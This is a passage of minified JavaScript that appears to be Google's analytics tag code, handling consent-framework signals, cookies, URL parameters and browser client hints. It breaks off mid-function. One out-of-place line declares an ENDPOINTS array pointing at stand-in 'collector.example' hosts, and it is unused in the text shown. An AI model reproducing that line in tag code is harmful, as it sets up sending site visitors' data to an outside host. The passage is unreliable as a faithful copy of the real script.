      var c = a.search(Eh),
        d = Dh(a, 0, b, c);
      if (0 > d) return null;
      var e = a.indexOf("&", d);
      if (0 > e || e > c) e = c;
      d += b.length + 1;
      return decodeURIComponent(a.slice(d, -1 !== e ? e : 0).replace(/\+/g, " "));
    },
    Gh = /[?&]($|#)/,
    Hh = function (a, b, c) {
      for (var d, e = a.search(Eh), f = 0, h, l = []; 0 <= (h = Dh(a, f, b, e));) l.push(a.substring(f, h)), f = Math.min(a.indexOf("&", h) + 1 || e, e);
      l.push(a.slice(f));
      d = l.join("").replace(Gh, "$1");
      var m,
        n = null != c ? "=" + encodeURIComponent(String(c)) : "";
      var p = b + n;
      if (p) {
        var q,
          t = d.indexOf("#");
        0 > t && (t = d.length);
        var r = d.indexOf("?"),
          u;
        0 > r || r > t ? (r = t, u = "") : u = d.substring(r + 1, t);
        q = [d.slice(0, r), u, d.slice(t)];
        var v = q[1];
        q[1] = p ? v ? v + "&" + p : p : v;
        m = q[0] + (q[1] ? "?" + q[1] : "") + q[2];
      } else m = d;
      return m;
    };
  var Ih = function (a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            xf(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    },
    Jh = function (a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    };
  function Kh(a) {
    if (!a || !F.head) return null;
    var b = Lh("META");
    F.head.appendChild(b);
    b.httpEquiv = "origin-trial";
    b.content = a;
    return b;
  }
  var Mh = function (a) {
      if (C.top == C) return 0;
      if (void 0 === a ? 0 : a) {
        var b = C.location.ancestorOrigins;
        if (b) return b[b.length - 1] == C.location.origin ? 1 : 2;
      }
      return Ih(C.top) ? 1 : 2;
    },
    Lh = function (a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    };
  function Nh(a, b, c, d) {
    d = void 0 === d ? !1 : d;
    a.google_image_requests || (a.google_image_requests = []);
    var e = Lh("IMG", a.document);
    if (c) {
      var f = function () {
        if (c) {
          var h = a.google_image_requests,
            l = jb(h, e);
          0 <= l && Array.prototype.splice.call(h, l, 1);
        }
        e.removeEventListener && e.removeEventListener("load", f, !1);
        e.removeEventListener && e.removeEventListener("error", f, !1);
      };
      zh(e, "load", f);
      zh(e, "error", f);
    }
    d && (e.attributionSrc = "");
    e.src = b;
    a.google_image_requests.push(e);
  }
  var Ph = function (a) {
      var b;
      b = void 0 === b ? !1 : b;
      var c = "https://pagead2.googlesyndication.com/pagead/gen_204?id=tcfe";
      Jh(a, function (d, e) {
        if (d || 0 === d) c += "&" + e + "=" + encodeURIComponent("" + d);
      });
      Oh(c, b);
    },
    Oh = function (a, b) {
      var c = window,
        d;
      b = void 0 === b ? !1 : b;
      d = void 0 === d ? !1 : d;
      if (c.fetch) {
        var e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        };
        d && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        });
        c.fetch(a, e);
      } else Nh(c, a, void 0 === b ? !1 : b, void 0 === d ? !1 : d);
    };
  var Qh = function () {};
  var Rh = function (a) {
      void 0 !== a.addtlConsent && "string" !== typeof a.addtlConsent && (a.addtlConsent = void 0);
      void 0 !== a.gdprApplies && "boolean" !== typeof a.gdprApplies && (a.gdprApplies = void 0);
      return void 0 !== a.tcString && "string" !== typeof a.tcString || void 0 !== a.listenerId && "number" !== typeof a.listenerId ? 2 : a.cmpStatus && "error" !== a.cmpStatus ? 0 : 3;
    },
    Sh = function (a, b) {
      b = void 0 === b ? {} : b;
      this.C = a;
      this.h = null;
      this.M = {};
      this.Ea = 0;
      var c;
      this.R = null != (c = b.im) ? c : 500;
      var d;
      this.K = null != (d = b.Ym) ? d : !1;
      this.D = null;
    };
  qa(Sh, Qh);
  var Uh = function (a) {
    return "function" === typeof a.C.__tcfapi || null != Th(a);
  };
  Sh.prototype.addEventListener = function (a) {
    var b = this,
      c = {
        internalBlockOnErrors: this.K
      },
      d = yh(function () {
        return a(c);
      }),
      e = 0;
    -1 !== this.R && (e = setTimeout(function () {
      c.tcString = "tcunavailable";
      c.internalErrorState = 1;
      d();
    }, this.R));
    var f = function (h, l) {
      clearTimeout(e);
      h ? (c = h, c.internalErrorState = Rh(c), c.internalBlockOnErrors = b.K, l && 0 === c.internalErrorState || (c.tcString = "tcunavailable", l || (c.internalErrorState = 3))) : (c.tcString = "tcunavailable", c.internalErrorState = 3);
      a(c);
    };
    try {
      Vh(this, "addEventListener", f);
    } catch (h) {
      c.tcString = "tcunavailable", c.internalErrorState = 3, e && (clearTimeout(e), e = 0), d();
    }
  };
  Sh.prototype.removeEventListener = function (a) {
    a && a.listenerId && Vh(this, "removeEventListener", null, a.listenerId);
  };
  var Xh = function (a, b, c) {
      var d;
      d = void 0 === d ? "755" : d;
      var e;
      a: {
        if (a.publisher && a.publisher.restrictions) {
          var f = a.publisher.restrictions[b];
          if (void 0 !== f) {
            e = f[void 0 === d ? "755" : d];
            break a;
          }
        }
        e = void 0;
      }
      var h = e;
      if (0 === h) return !1;
      var l = c;
      2 === c ? (l = 0, 2 === h && (l = 1)) : 3 === c && (l = 1, 1 === h && (l = 0));
      var m;
      if (0 === l) {
        if (a.purpose && a.vendor) {
          var n = Wh(a.vendor.consents, void 0 === d ? "755" : d);
          m = n && "1" === b && a.purposeOneTreatment && "CH" === a.publisherCC ? !0 : n && Wh(a.purpose.consents, b);
        } else m = !0;
      } else m = 1 === l ? a.purpose && a.vendor ? Wh(a.purpose.legitimateInterests, b) && Wh(a.vendor.legitimateInterests, void 0 === d ? "755" : d) : !0 : !0;
      return m;
    },
    Wh = function (a, b) {
      return !(!a || !a[b]);
    },
    Vh = function (a, b, c, d) {
      c || (c = function () {});
      if ("function" === typeof a.C.__tcfapi) {
        var e = a.C.__tcfapi;
        e(b, 2, c, d);
      } else if (Th(a)) {
        Yh(a);
        var f = ++a.Ea;
        a.M[f] = c;
        if (a.h) {
          var h = {};
          a.h.postMessage((h.__tcfapiCall = {
            command: b,
            version: 2,
            callId: f,
            parameter: d
          }, h), "*");
        }
      } else c({}, !1);
    },
    Th = function (a) {
      if (a.h) return a.h;
      var b;
      a: {
        for (var c = a.C, d = 0; 50 > d; ++d) {
          var e;
          try {
            e = !(!c.frames || !c.frames.__tcfapiLocator);
          } catch (l) {
            e = !1;
          }
          if (e) {
            b = c;
            break a;
          }
          var f;
          b: {
            try {
              var h = c.parent;
              if (h && h != c) {
                f = h;
                break b;
              }
            } catch (l) {}
            f = null;
          }
          if (!(c = f)) break;
        }
        b = null;
      }
      a.h = b;
      return a.h;
    },
    Yh = function (a) {
      a.D || (a.D = function (b) {
        try {
          var c;
          c = ("string" === typeof b.data ? JSON.parse(b.data) : b.data).__tcfapiReturn;
          a.M[c.callId](c.returnValue, c.success);
        } catch (d) {}
      }, zh(a.C, "message", a.D));
    },
    Zh = function (a) {
      if (!1 === a.gdprApplies) return !0;
      void 0 === a.internalErrorState && (a.internalErrorState = Rh(a));
      return "error" === a.cmpStatus || 0 !== a.internalErrorState ? a.internalBlockOnErrors ? (Ph({
        e: String(a.internalErrorState)
      }), !1) : !0 : "loaded" !== a.cmpStatus || "tcloaded" !== a.eventStatus && "useractioncomplete" !== a.eventStatus ? !1 : !0;
    };
  var $h = {
      1: 0,
      3: 0,
      4: 0,
      7: 3,
      9: 3,
      10: 3
    },
    ai = rh('', 500);
  function bi() {
    var a = ye.tcf || {};
    return ye.tcf = a;
  }
  var ci = function () {
      return new Sh(C, {
        im: -1
      });
    },
    ji = function () {
      var a = bi(),
        b = ci();
      Uh(b) && di() && K(124);
      if ((ei() || Q(62)) && !a.active && Uh(b)) {
        ei() && (a.active = !0, a.Eb = {}, a.cmpId = 0, a.tcfPolicyVersion = 0, Q(62) ? Ef().active = !0 : fi(), a.tcString = "tcunavailable");
        Q(62) && dg();
        try {
          b.addEventListener(function (c) {
            if (0 !== c.internalErrorState) gi(a), Q(62) ? (eg([L.g.H, L.g.ya, L.g.N]), Ef().active = !0) : hi(a);else {
              a.gdprApplies = c.gdprApplies;
              if (Q(62)) {
                a.cmpId = c.cmpId;
                a.enableAdvertiserConsentMode = c.enableAdvertiserConsentMode;
                !0 === bi().enableAdvertiserConsentMode && (a.active = !0);
                if (ii(c) && di()) {
                  eg([L.g.H, L.g.ya, L.g.N]);
                  return;
                }
                a.tcfPolicyVersion = c.tcfPolicyVersion;
              }
              var d;
              if (!1 === c.gdprApplies) {
                var e = {},
                  f;
                for (f in $h) $h.hasOwnProperty(f) && (e[f] = !0);
                d = e;
                b.removeEventListener(c);
              } else if (ii(c)) {
                var h = {},
                  l;
                for (l in $h) if ($h.hasOwnProperty(l)) if ("1" === l) {
                  var m,
                    n = c,
                    p = !0;
                  p = void 0 === p ? !1 : p;
                  m = Zh(n) ? !1 === n.gdprApplies || "tcunavailable" === n.tcString || void 0 === n.gdprApplies && !p || "string" !== typeof n.tcString || !n.tcString.length ? !0 : Xh(n, "1", 0) : !1;
                  h["1"] = m;
                } else h[l] = Xh(c, l, $h[l]);
                d = h;
              }
              d && (a.tcString = c.tcString || "tcempty", a.Eb = d, hi(a));
            }
          });
        } catch (c) {
          gi(a), Q(62) ? (eg([L.g.H, L.g.ya, L.g.N]), Ef().active = !0) : hi(a);
        }
      }
    };
  function gi(a) {
    a.type = "e";
    a.tcString = "tcunavailable";
  }
  const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
  function ii(a) {
    return "tcloaded" === a.eventStatus || "useractioncomplete" === a.eventStatus || "cmpuishown" === a.eventStatus;
  }
  function fi() {
    var a = {},
      b = (a[L.g.H] = "denied", a[L.g.jf] = ai, a);
    Zf(b);
  }
  var ei = function () {
      return !0 === C.gtag_enable_tcf_support;
    },
    di = function () {
      var a = ei();
      return Q(62) ? !a && !0 !== bi().enableAdvertiserConsentMode : !a;
    };
  function hi(a) {
    var b = {},
      c = (b[L.g.H] = a.Eb["1"] ? "granted" : "denied", b);
    if (Q(62)) {
      if (!0 !== a.gdprApplies) {
        eg([L.g.H, L.g.ya, L.g.N]);
        Ef().active = !0;
        return;
      }
      c[L.g.ya] = a.Eb["3"] && a.Eb["4"] ? "granted" : "denied";
      "number" === typeof a.tcfPolicyVersion && 4 <= a.tcfPolicyVersion ? c[L.g.N] = a.Eb["1"] && a.Eb["7"] ? "granted" : "denied" : eg([L.g.N]);
    }
    $f(c, {
      eventId: 0
    }, {
      gdprApplies: a ? a.gdprApplies : void 0,
      tcString: ki() || ""
    });
  }
  var ki = function () {
      var a = bi();
      if (a.active) return a.tcString;
    },
    li = function () {
      var a = bi();
      if (a.active && void 0 !== a.gdprApplies) return a.gdprApplies ? "1" : "0";
    },
    mi = function (a) {
      if (!$h.hasOwnProperty(String(a))) return !0;
      var b = bi();
      return b.active && b.Eb ? !!b.Eb[String(a)] : !0;
    };
  var ni = [L.g.H, L.g.P],
    oi = [L.g.H, L.g.P, L.g.N, L.g.ya],
    pi = {},
    qi = (pi[L.g.H] = 1, pi[L.g.P] = 2, pi);
  function ri(a) {
    if (void 0 === a) return 0;
    switch (T(a, L.g.ka)) {
      case void 0:
        return 1;
      case !1:
        return 3;
      default:
        return 2;
    }
  }
  var si = function (a) {
      var b = ri(a);
      if (3 === b) return !1;
      if (Q(54)) switch (Nf(L.g.ya)) {
        case 1:
        case 3:
          break;
        case 2:
          return !1;
        case 4:
          return 2 === b;
        case 0:
          break;
        default:
          return !1;
      }
      return !0;
    },
    ti = function () {
      return Pf() || !Mf(L.g.H) || !Mf(L.g.P);
    },
    ui = function () {
      var a = {},
        b;
      for (b in qi) qi.hasOwnProperty(b) && (a[qi[b]] = Nf(b));
      var c = Q(40) && ni.every(Mf),
        d = Q(36);
      return c || d ? nc(a, 1) : nc(a, 0);
    },
    vi = {},
    wi = (vi[L.g.H] = 0, vi[L.g.P] = 1, vi[L.g.N] = 2, vi[L.g.ya] = 3, vi);
  function xi(a) {
    switch (a) {
      case void 0:
        return 1;
      case !0:
        return 3;
      case !1:
        return 2;
      default:
        return 0;
    }
  }
  var yi = function (a) {
      if (Q(37)) {
        for (var b = "1", c = 0; c < oi.length; c++) {
          var d = b,
            e,
            f = oi[c],
            h = Cf[f];
          e = void 0 === h ? 0 : wi.hasOwnProperty(h) ? 12 | wi[h] : 8;
          var l = Ef();
          l.accessedAny = !0;
          var m = l.entries[f] || {};
          e = e << 2 | xi(m.implicit);
          b = d + ("" + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[e] + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[xi(m.declare) << 4 | xi(m.default) << 2 | xi(m.update)]);
        }
        var n = b,
          p;
        p = "" + (Pf() << 2 | ri(a));
        return n + p;
      }
      for (var q = "G1", t = 0; t < ni.length; t++) {
        var r;
        a: {
          var u = ni[t],
            v = Ef();
          v.accessedDefault = !0;
          switch ((v.entries[u] || {}).default) {
            case !0:
              r = 3;
              break a;
            case !1:
              r = 2;
              break a;
            default:
              r = 1;
          }
        }
        switch (r) {
          case 3:
            q += "1";
            break;
          case 2:
            q += "0";
            break;
          case 1:
            q += "-";
        }
      }
      return q;
    },
    zi = function () {
      if (!Mf(L.g.N)) return "-";
      var a = {},
        b = Ef().cps,
        c;
      for (c in b) b.hasOwnProperty(c) && (a[c] = {
        enabled: b[c].enabled,
        region: b[c].region
      });
      for (var d = {}, e = ha(Object.keys(a)), f = e.next(); !f.done; f = e.next()) {
        var h = f.value;
        d[h] = a[h].enabled;
      }
      for (var l = "", m = ha(Object.keys(we)), n = m.next(); !n.done; n = m.next()) {
        var p = n.value;
        !1 !== d[p] && (l += we[p]);
      }
      return "" === l ? "-" : l;
    };
  function Ai() {
    var a = !!qf["6"],
      b = !1;
    Q(62) && (b = !di() && "1" === li());
    return a || b;
  }
  var Bi = function () {
      return Ai() ? "1" : "0";
    },
    Ci = function () {
      return Ai() || Ef().usedSetCps || !Mf(L.g.N);
    },
    Di = function () {
      var a = "0",
        b = "0",
        c;
      var d = bi();
      c = d.active && Q(62) ? d.cmpId : void 0;
      "number" === typeof c && 0 <= c && 4095 >= c && (a = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[c >> 6 & 63], b = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[c & 63]);
      var e = "0",
        f;
      var h = bi();
      f = h.active && Q(62) ? h.tcfPolicyVersion : void 0;
      "number" === typeof f && 0 <= f && 63 >= f && (e = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[f]);
      var l = 0;
      qf["6"] && (l |= 1);
      "1" === li() && (l |= 2);
      ei() && (l |= 4);
      var m;
      var n = bi();
      m = void 0 !== n.enableAdvertiserConsentMode ? n.enableAdvertiserConsentMode ? "1" : "0" : void 0;
      "1" === m && (l |= 8);
      Ef().waitPeriodTimedOut && (l |= 16);
      return "1" + a + b + e + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[l];
    };
  var Ei = function (a, b, c) {
    for (var d = [], e = b.split(";"), f = 0; f < e.length; f++) {
      var h = e[f].split("="),
        l = h[0].replace(/^\s*|\s*$/g, "");
      if (l && l == a) {
        var m = h.slice(1).join("=").replace(/^\s*|\s*$/g, "");
        m && c && (m = decodeURIComponent(m));
        d.push(m);
      }
    }
    return d;
  };
  function Fi(a) {
    return "null" !== a.origin;
  }
  ;
  var Ii = function (a, b, c, d) {
      return Gi(d) ? Ei(a, String(b || Hi()), c) : [];
    },
    Li = function (a, b, c, d, e) {
      if (Gi(e)) {
        var f = Ji(a, d, e);
        if (1 === f.length) return f[0].id;
        if (0 !== f.length) {
          f = Ki(f, function (h) {
            return h.Je;
          }, b);
          if (1 === f.length) return f[0].id;
          f = Ki(f, function (h) {
            return h.Nd;
          }, c);
          return f[0] ? f[0].id : void 0;
        }
      }
    };
  function Mi(a, b, c, d) {
    var e = Hi(),
      f = window;
    Fi(f) && (f.document.cookie = a);
    var h = Hi();
    return e != h || void 0 != c && 0 <= Ii(b, h, !1, d).indexOf(c);
  }
  var Qi = function (a, b, c) {
      function d(r, u, v) {
        if (null == v) return delete h[u], r;
        h[u] = v;
        return r + "; " + u + "=" + v;
      }
      function e(r, u) {
        if (null == u) return delete h[u], r;
        h[u] = !0;
        return r + "; " + u;
      }
      if (!Gi(c.ib)) return 2;
      var f;
      void 0 == b ? f = a + "=deleted; expires=" + new Date(0).toUTCString() : (c.encode && (b = encodeURIComponent(b)), b = Ni(b), f = a + "=" + b);
      var h = {};
      f = d(f, "path", c.path);
      var l;
      c.expires instanceof Date ? l = c.expires.toUTCString() : null != c.expires && (l = "" + c.expires);
      f = d(f, "expires", l);
      f = d(f, "max-age", c.fn);
      f = d(f, "samesite", c.hn);
      c.jn && (f = e(f, "secure"));
      var m = c.domain;
      if (m && "auto" === m.toLowerCase()) {
        for (var n = Oi(), p = 0; p < n.length; ++p) {
          var q = "none" !== n[p] ? n[p] : void 0,
            t = d(f, "domain", q);
          t = e(t, c.flags);
          if (!Pi(q, c.path) && Mi(t, a, b, c.ib)) return 0;
        }
        return 1;
      }
      m && "none" !== m.toLowerCase() && (f = d(f, "domain", m));
      f = e(f, c.flags);
      return Pi(m, c.path) ? 1 : Mi(f, a, b, c.ib) ? 0 : 1;
    },
    Ri = function (a, b, c) {
      null == c.path && (c.path = "/");
      c.domain || (c.domain = "auto");
      return Qi(a, b, c);
    };
  function Ki(a, b, c) {
    for (var d = [], e = [], f, h = 0; h < a.length; h++) {
      var l = a[h],
        m = b(l);
      m === c ? d.push(l) : void 0 === f || m < f ? (e = [l], f = m) : m === f && e.push(l);
    }
    return 0 < d.length ? d : e;
  }
  function Ji(a, b, c) {
    for (var d = [], e = Ii(a, void 0, void 0, c), f = 0; f < e.length; f++) {
      var h = e[f].split("."),
        l = h.shift();
      if (!b || -1 !== b.indexOf(l)) {
        var m = h.shift();
        m && (m = m.split("-"), d.push({
          id: h.join("."),
          Je: 1 * m[0] || 1,
          Nd: 1 * m[1] || 1
        }));
      }
    }
    return d;
  }
  var Ni = function (a) {
      a && 1200 < a.length && (a = a.substring(0, 1200));
      return a;
    },
    Si = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/,
    Ti = /(^|\.)doubleclick\.net$/i,
    Pi = function (a, b) {
      return Ti.test(window.document.location.hostname) || "/" === b && Si.test(a);
    },
    Hi = function () {
      return Fi(window) ? window.document.cookie : "";
    },
    Oi = function () {
      var a = [],
        b = window.document.location.hostname.split(".");
      if (4 === b.length) {
        var c = b[b.length - 1];
        if (parseInt(c, 10).toString() === c) return ["none"];
      }
      for (var d = b.length - 2; 0 <= d; d--) a.push(b.slice(d).join("."));
      var e = window.document.location.hostname;
      Ti.test(e) || Si.test(e) || a.push("none");
      return a;
    },
    Gi = function (a) {
      return a && zf().h() ? (g(a) ? [a] : a).every(function (b) {
        return Of(b) && Mf(b);
      }) : !0;
    };
  var Ui = function (a) {
      var b = Math.round(2147483647 * Math.random());
      return a ? String(b ^ jf(a) & 2147483647) : String(b);
    },
    Vi = function (a) {
      return [Ui(a), Math.round(Ka() / 1E3)].join(".");
    },
    Yi = function (a, b, c, d, e) {
      var f = Wi(b);
      return Li(a, f, Xi(c), d, e);
    },
    Zi = function (a, b, c, d) {
      var e = "" + Wi(c),
        f = Xi(d);
      1 < f && (e += "-" + f);
      return [b, e, a].join(".");
    },
    Wi = function (a) {
      if (!a) return 1;
      a = 0 === a.indexOf(".") ? a.substr(1) : a;
      return a.split(".").length;
    },
    Xi = function (a) {
      if (!a || "/" === a) return 1;
      "/" !== a[0] && (a = "/" + a);
      "/" !== a[a.length - 1] && (a += "/");
      return a.split("/").length - 1;
    };
  var $i = function () {
    ye.dedupe_gclid || (ye.dedupe_gclid = "" + Vi());
    return ye.dedupe_gclid;
  };
  var aj = function () {
    var a = !1;
    return a;
  };
  var bj = {
      UA: 1,
      AW: 2,
      DC: 3,
      G: 4,
      GF: 5,
      GT: 12,
      GTM: 14,
      HA: 6,
      MC: 7
    },
    cj = function (a, b) {
      var c = mg.ctid.split("-")[0].toUpperCase(),
        d = {};
      d.ctid = mg.ctid;
      d.Xl = xe.qd;
      d.Zl = xe.Lf;
      d.Bl = kg.nd ? 2 : 1;
      d.Xh = mg.He;
      d.Xh !== a && (d.bf = a);
      Q(91) ? d.Ei = 1 : Q(90) && (d.Ei = 2);
      Ee ? (d.Ze = bj[c], d.Ze || (d.Ze = 0)) : d.Ze = Ke ? 13 : 10;
      Ie ? d.ig = 1 : aj() ? d.ig = 2 : d.ig = 3;
      var e;
      var f = d.Ze,
        h = d.ig;
      void 0 === f ? e = "" : (h || (h = 0), e = "" + Ed(1, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[f << 2 | h]);
      var l = d.Xm,
        m = 4 + e + (l ? "" + Ed(2, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[l] : ""),
        n,
        p = d.Zl;
      n = p && Dd.test(p) ? "" + Ed(3, 2) + p : "";
      var q,
        t = d.Xl;
      q = t ? "" + Ed(4, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[t] : "";
      var r;
      var u = d.ctid;
      if (u && b) {
        var v = u.split("-"),
          w = v[0].toUpperCase();
        if ("GTM" !== w && "OPT" !== w) r = "";else {
          var x = v[1];
          r = "" + Ed(5, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[1 + x.length] + (d.Bl || 0) + x;
        }
      } else r = "";
      var y = d.Ei,
        A = d.Xh,
        B = d.bf,
        D = d.kn;
      return m + n + q + r + (y ? "" + Ed(6, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[y] : "") + (A ? "" + Ed(7, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[A.length] + A : "") + (B ? "" + Ed(8, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[B.length] + B : "") + (D ? "" + Ed(9, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[D.length] + D : "");
    };
  var dj = void 0;
  function ej(a) {
    var b = "";
    return b;
  }
  ;
  Bb();
  Bh() || yb("iPod");
  yb("iPad");
  !yb("Android") || Cb() || Bb() || Ab() || yb("Silk");
  Cb();
  !yb("Safari") || Cb() || (zb() ? 0 : yb("Coast")) || Ab() || (zb() ? 0 : yb("Edge")) || (zb() ? xb("Microsoft Edge") : yb("Edg/")) || (zb() ? xb("Opera") : yb("OPR")) || Bb() || yb("Silk") || yb("Android") || Ch();
  var fj = {},
    gj = null,
    hj = function (a) {
      for (var b = [], c = 0, d = 0; d < a.length; d++) {
        var e = a.charCodeAt(d);
        255 < e && (b[c++] = e & 255, e >>= 8);
        b[c++] = e;
      }
      var f = 4;
      void 0 === f && (f = 0);
      if (!gj) {
        gj = {};
        for (var h = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), l = ["+/=", "+/", "-_=", "-_.", "-_"], m = 0; 5 > m; m++) {
          var n = h.concat(l[m].split(""));
          fj[m] = n;
          for (var p = 0; p < n.length; p++) {
            var q = n[p];
            void 0 === gj[q] && (gj[q] = p);
          }
        }
      }
      for (var t = fj[f], r = Array(Math.floor(b.length / 3)), u = t[64] || "", v = 0, w = 0; v < b.length - 2; v += 3) {
        var x = b[v],
          y = b[v + 1],
          A = b[v + 2],
          B = t[x >> 2],
          D = t[(x & 3) << 4 | y >> 4],
          I = t[(y & 15) << 2 | A >> 6],
          J = t[A & 63];
        r[w++] = "" + B + D + I + J;
      }
      var E = 0,
        G = u;
      switch (b.length - v) {
        case 2:
          E = b[v + 1], G = t[(E & 15) << 2] || u;
        case 1:
          var M = b[v];
          r[w] = "" + t[M >> 2] + t[(M & 3) << 4 | E >> 4] + G + u;
      }
      return r.join("");
    };
  Object.freeze({});
  var ij = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
  function jj() {
    var a;
    return null != (a = C.google_tag_data) ? a : C.google_tag_data = {};
  }
  function kj() {
    var a = C.google_tag_data,
      b;
    if (null != a && a.uach) {
      var c = a.uach,
        d = Object.assign({}, c);
      c.fullVersionList && (d.fullVersionList = c.fullVersionList.slice(0));
      b = d;
    } else b = null;
    return b;
  }
  function lj() {
    var a, b;
    return null != (b = null == (a = C.google_tag_data) ? void 0 : a.uach_promise) ? b : null;
  }
  function mj() {
    var a, b;
    return "function" === typeof (null == (a = C.navigator) ? void 0 : null == (b = a.userAgentData) ? void 0 : b.getHighEntropyValues);
  }
  function nj() {
    if (!mj()) return null;
    var a = jj();
    if (a.uach_promise) return a.uach_promise;
    var b = C.navigator.userAgentData.getHighEntropyValues(ij).then(function (c) {
      null != a.uach || (a.uach = c);
      return c;
    });
    return a.uach_promise = b;
  }
  ;
  var tj = /:[0-9]+$/,
    uj = /^\d+\.fls\.doubleclick\.net$/,
    vj = function (a, b, c) {
      function d(p) {
        return hd(10) ? decodeURIComponent(p.replace(/\+/g, " ")) : decodeURIComponent(p).replace(/\+/g, " ");
      }
      for (var e = ha(a.split("&")), f = e.next(); !f.done; f = e.next()) {
        var h = ha(f.value.split("=")),
          l = h.next().value,
          m = ia(h);
        if (d(l) === b) {
          var n = m.join("=");
          return c ? n : d(n);
        }
      }
    },
    yj = function (a, b, c, d, e) {
      b && (b = String(b).toLowerCase());
      if ("protocol" === b || "port" === b) a.protocol = wj(a.protocol) || wj(C.location.protocol);
      "port" === b ? a.port = String(Number(a.hostname ? a.port : C.location.port) || ("http" === a.protocol ? 80 : "https" === a.protocol ? 443 : "")) : "host" === b && (a.hostname = (a.hostname || C.location.hostname).replace(tj, "").toLowerCase());
      return xj(a, b, c, d, e);
    },
    xj = function (a, b, c, d, e) {
      var f,
        h = wj(a.protocol);
      b && (b = String(b).toLowerCase());
      switch (b) {
        case "url_no_fragment":
          f = zj(a);
          break;
        case "protocol":
          f = h;
          break;
        case "host":
          f = a.hostname.replace(tj, "").toLowerCase();
          if (c) {
            var l = /^www\d*\./.exec(f);
            l && l[0] && (f = f.substr(l[0].length));
          }
          break;
        case "port":
          f = String(Number(a.port) || ("http" === h ? 80 : "https" === h ? 443 : ""));
          break;
        case "path":
          a.pathname || a.hostname || gb("TAGGING", 1);
          f = "/" === a.pathname.substr(0, 1) ? a.pathname : "/" + a.pathname;
          var m = f.split("/");
          0 <= (d || []).indexOf(m[m.length - 1]) && (m[m.length - 1] = "");
          f = m.join("/");
          break;
        case "query":
          f = a.search.replace("?", "");
          e && (f = vj(f, e));
          break;
        case "extension":
          var n = a.pathname.split(".");
          f = 1 < n.length ? n[n.length - 1] : "";
          f = f.split("/")[0];
          break;
        case "fragment":
          f = a.hash.replace("#", "");
          break;
        default:
          f = a && a.href;
      }
      return f;
    },
    wj = function (a) {
      return a ? a.replace(":", "").toLowerCase() : "";
    },
    zj = function (a) {
      var b = "";
      if (a && a.href) {
        var c = a.href.indexOf("#");
        b = 0 > c ? a.href : a.href.substr(0, c);
      }
      return b;
    },
    Aj = function (a) {
      var b = F.createElement("a");
      a && (b.href = a);
      var c = b.pathname;
      "/" !== c[0] && (a || gb("TAGGING", 1), c = "/" + c);
      var d = b.hostname.replace(tj, "");
      return {
        href: b.href,
        protocol: b.protocol,
        host: b.host,
        hostname: d,
        pathname: c,
        search: b.search,
        hash: b.hash,
        port: b.port
      };
    },
    Bj = function (a) {
      function b(n) {
        var p = n.split("=")[0];
        return 0 > d.indexOf(p) ? n : p + "=0";
      }
      function c(n) {
        return n.split("&").map(b).filter(function (p) {
          return void 0 !== p;
        }).join("&");
      }
      var d = "gclid dclid gbraid wbraid gclaw gcldc gclha gclgf gclgb _gl".split(" "),
        e = Aj(a),
        f = a.split(/[?#]/)[0],
        h = e.search,
        l = e.hash;
      "?" === h[0] && (h = h.substring(1));
      "#" === l[0] && (l = l.substring(1));
      h = c(h);
      l = c(l);
      "" !== h && (h = "?" + h);
      "" !== l && (l = "#" + l);
      var m = "" + f + h + l;
      "/" === m[m.length - 1] && (m = m.substring(0, m.length - 1));
      return m;
    },
    Cj = function (a) {
      var b = Aj(C.location.href),
        c = yj(b, "host", !1);
      if (c && c.match(uj)) {
        var d = yj(b, "path").split(a + "=");
        if (1 < d.length) return d[1].split(";")[0].split("?")[0];
      }
    };
  function Dj(a, b, c, d) {
    var e,
      f = Number(null != a.Bb ? a.Bb : void 0);
    0 !== f && (e = new Date((b || Ka()) + 1E3 * (f || 7776E3)));
    return {
      path: a.path,
      domain: a.domain,
      flags: a.flags,
      encode: !!c,
      expires: e,
      ib: d
    };
  }
  ;
  var Ej;
  var Ij = function () {
      var a = Fj,
        b = Gj,
        c = Hj(),
        d = function (h) {
          a(h.target || h.srcElement || {});
        },
        e = function (h) {
          b(h.target || h.srcElement || {});
        };
      if (!c.init) {
        ac(F, "mousedown", d);
        ac(F, "keyup", d);
        ac(F, "submit", e);
        var f = HTMLFormElement.prototype.submit;
